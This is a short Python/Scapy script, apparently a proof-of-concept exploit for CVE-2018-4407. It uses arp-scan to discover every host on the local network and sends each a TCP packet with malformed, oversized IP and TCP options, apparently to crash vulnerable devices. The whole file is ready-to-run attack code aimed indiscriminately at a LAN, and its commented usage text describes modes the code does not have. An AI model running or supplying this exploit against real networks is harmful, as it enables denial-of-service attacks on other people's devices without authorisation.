from scapy.all import *
import os


ips_raw = os.popen("arp-scan -I en1 -l | awk '{print $1}'").readlines()
ips_str = ''.join(str(e) for e in ips_raw)
ips_array = ips_str.split('\n')
ips_array.remove('')

IPP = ips_array
for j in IPP:
        try:
            send(IP(dst=j,options=[IPOption("A"*8)])/TCP(dport=2323,options=[(19, "1"*18),(19, "2"*18)]))
        except:
            pass
# except Exception as e:
        # print ("Usage python CVE-2018-4407.py Mode Router IP")
        # print ("Modes: a = Single | b = Fuzzy")